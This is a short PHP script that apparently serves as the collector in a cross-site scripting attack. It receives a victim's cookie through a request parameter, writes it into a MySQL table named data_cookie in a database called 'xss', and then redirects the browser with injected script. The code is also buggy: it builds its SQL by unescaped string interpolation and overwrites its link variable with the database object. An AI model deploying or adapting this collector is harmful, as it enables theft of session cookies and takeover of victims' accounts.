<?php
$cookie = $_REQUEST['cookie'];
$link = $_REQUEST['link'];
$link = new mysqli("127.0.0.1", "root", "", "xss");
$link->query("INSERT INTO data_cookie (cookie) VALUES ($cookie)");
$link->close();
echo "<a href='$link'>link</a>";
echo "<script>window.open(document.links[1].baseURI, '_self')</script>";
?>